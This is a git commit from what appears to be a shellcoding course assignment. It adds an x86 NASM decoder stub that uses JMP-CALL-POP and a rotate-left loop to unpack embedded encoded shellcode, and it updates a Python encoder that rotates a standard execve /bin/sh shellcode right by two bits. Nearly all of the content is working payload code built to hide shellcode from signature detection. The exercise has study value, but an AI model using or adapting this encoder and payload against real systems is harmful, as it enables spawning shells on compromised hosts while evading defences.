a0b5fd156fbae1f93ce3355375c43094d1538d77
blu3gl0w13 <blu3gl0w13@gmail.com>
2016-09-06 21:37:10 -0700

    Assignment 4 working

---
+++ assignment-4/decoder-execve.nasm
@@ -0,0 +1,45 @@
+;
+;
+;
+;
+;
+;
+;
+;
+;
+
+
+
+global _start
+
+section .text
+
+
+_start:
+
+	; JMP CALL POP
+	; to get address of our
+	; encoded shellcode
+
+	jmp shellcode
+
+
+decoder:
+	pop esi
+	xor ecx, ecx
+	mov cl, shellLen
+	xor edx, edx	
+decode:
+	mov dl, byte [esi]
+	rol dl, 0x2
+	mov byte [esi], dl
+	inc esi
+	loop decode
+	jmp short encShellcode
+	
+	
+shellcode:
+
+	call decoder
+	encShellcode: db  0x4c,0x30,0x14,0x1a,0xcb,0xcb,0xdc,0x1a,0x1a,0xcb,0x98,0x5a,0x9b,0x62,0xf8,0x14,0x62,0xb8,0xd4,0x62,0x78,0x2c,0xc2,0x73,0x20
+	shellLen: equ $-encShellcode
--- assignment-4/encoder.py
+++ assignment-4/encoder.py
@@ -15,28 +15,40 @@
 import sys
 
 
+#-------------------------------------------------------------------
+#
+# The following Bitwise rotation functions
+# have been translated from the following blog
+# http://www.falatic.com/index.php/108/python-and-bitwise-rotation
+#-------------------------------------------------------------------
+
+def ror(valueToBeRotated, rotateAmount):
+
+  return ((valueToBeRotated & 0xff) >> rotateAmount % 8) | (valueToBeRotated << (8 - (rotateAmount % 8)) & 0xff)
+
+
+
+def rol(valueToBeRotated, rotateAmount):
+
+  return ((valueToBeRotated << (rotateAmount % 8)) & 0xff) | ((valueToBeRotated & 0xff) >> (8 - (rotateAmount % 8)))
+
+
 
 shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 
+
+
 encshellcode = ""
 encshellcode2 = ""
-xorencshellcode = ""
-xorencshellcode2 = ""
 
 for i in bytearray(shellcode):
 
-  x = i >> 2
+  x = ror(i, 2)
+  #x = i >> 2
   encshellcode += "\\x%02x," % x
   encshellcode2 += "0x%02x," % x
 
-for y in bytearray(encshellcode):
-
-  a = y ^ 0xad
-  xorencshellcode += "\\x%02x," % a
-  xorencshellcode2 += "0x%02x," % a
 
 print "Encoded Shellcode: %s\n" % encshellcode
 print "Encoded Shellcode 2: %s\n\n" % encshellcode2
 
-print "XOR Shifted Shellcode: %s\n" % xorencshellcode
-print "XOR Shifted Shellcode: %s\n\n" % xorencshellcode2
